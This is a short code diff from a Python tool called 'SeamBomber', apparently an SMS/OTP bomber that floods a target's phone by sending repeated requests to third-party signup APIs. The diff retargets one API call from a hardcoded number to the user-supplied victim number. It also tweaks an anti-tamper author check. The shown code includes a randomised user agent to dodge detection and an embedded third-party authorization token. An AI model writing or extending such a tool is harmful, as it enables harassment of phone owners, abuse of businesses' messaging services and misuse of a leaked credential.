@@ -14,7 +14,7 @@ useragent = random.choice(useragentList)
 #Access Checking Function
 def check():
     file = open("seam.py", "r").read()
-    if not ("Author : Sh-Seam" in file) or not ("GitHub : https://github.com/Sh-Seam" in file) or not ("SeamBomber" in file) or not ("https://raw.githubusercontent.com/Sh-Seam/seam/main/more/.version" in file):
+    if not ("Author : Sh-Seam" in file) or not ("GitHub  : https://github.com/Sh-Seam" in file) or not ("SeamBomber" in file) or not ("https://raw.githubusercontent.com/Sh-Seam/seam/main/more/.version" in file):
         print("\n\033[92m[\033[91m!\033[92m] You Have No Permission To Access This Tool!\u001b[34;1m")
         print("\033[92m[\033[91m!\033[92m] Delete This Tool and git clone Again To Use It!\u001b[34;1m")                       
         print("\n\033[92m[\033[91m*\033[92m] Tool Link: \033[37mhttps://github.com/Sh-Seam/seam\n\u001b[34;1m")                                                                                                                                                           
@@ -136,7 +136,7 @@ def api9(number):
         "User-Agent": useragent,
 	
         "x-authorization": "QoFN68MGTcosJxSmDf5GCgxXlNcgE1mUH9MUWuDHgs7dugjR7P2ziASzpo3frHL3"}
-    data = {"mobile_number":"01792433083","referral":"false"}
+    data = {"mobile_number":"0"+number,"referral":"false"}
     try:
         response = requests.post(url, headers = headers, data = data).status_code
         return response
